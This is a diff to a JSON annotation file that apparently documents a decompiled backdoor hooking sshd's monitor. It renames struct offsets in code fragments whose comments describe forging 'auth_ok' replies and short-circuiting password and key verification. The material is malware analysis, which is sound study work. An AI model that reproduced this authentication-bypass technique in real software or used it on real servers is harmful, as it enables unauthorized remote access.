@@ -1884,7 +1884,7 @@
         "comment": "Missing ssh or monitor arguments mean the hook can\u2019t safely forge a reply\u2014exit immediately to avoid corrupting sshd\u2019s dispatcher."
       },
       {
-        "match": "if ((*(ushort *)(sshd_ctx + 0x90) == 0) ||",
+        "match": "if ((sshd_ctx->pending_authpayload_len == 0) ||",
         "comment": "When no payload queued an authpassword body, synthesize the minimal reply frame: monitor reqtype + auth_ok byte (+ optional root_allowed dword)."
       },
       {
@@ -1892,7 +1892,7 @@
         "comment": "Whether the reply came from the payload or was synthesized on the stack, push it straight to the monitor socket so sshd never re-enters its password handler."
       },
       {
-        "match": "**(u64 **)(sshd_ctx + 0xa0) = *(u64 *)(sshd_ctx + 0xd0);",
+        "match": "*sshd_ctx->mm_answer_authpassword_slot = sshd_ctx->mm_answer_authpassword_start;",
         "comment": "Restore the saved monitor dispatch entry so the next request drops back into sshd\u2019s genuine `mm_answer_authpassword` implementation."
       }
     ]
@@ -1943,16 +1943,16 @@
     "plate": "Short-circuits `MONITOR_REQ_KEYVERIFY` by streaming the payload-staged reply instead of running sshd\u2019s verifier. Once\n`global_ctx` exposes libc imports and `sshd_ctx` recorded a reply length/buffer, the hook writes the blob to the monitor\nsocket, restores the saved dispatch slot, and reports success; missing metadata or a failed write triggers libc\u2019s\n`exit(0)` so sshd never continues with a partially installed hook.",
     "inline": [
       {
-        "match": "if ((*(ushort *)(sshd_ctx + 0x84) != 0) &&",
+        "match": "if ((sshd_ctx->keyverify_reply_len != 0) &&",
         "comment": "Only run when keyallowed already staged both the reply length and buffer; otherwise keep sshd\u2019s original handler."
       },
       {
-        "match": "(write_result = fd_write_full(sock,*(void **)(sshd_ctx + 0x88),(ulong)*(ushort *)(sshd_ctx + 0x84),libc_imports)",
+        "match": "(write_result = fd_write_full(sock,sshd_ctx->keyverify_reply_buf,(ulong)sshd_ctx->keyverify_reply_len,libc_imports)",
         "comment": "Send the canned reply straight to the monitor socket so sshd believes the keyverify exchange already succeeded.",
         "match_type": "substring"
       },
       {
-        "match": "**(u64 **)(sshd_ctx + 0xa0) = *(u64 *)(sshd_ctx + 0xd8);",
+        "match": "*sshd_ctx->mm_answer_keyverify_slot = sshd_ctx->mm_answer_keyverify_start;",
         "comment": "Drop the preserved mm_answer_keyverify pointer back into the live dispatch slot before returning success."
       },
       {
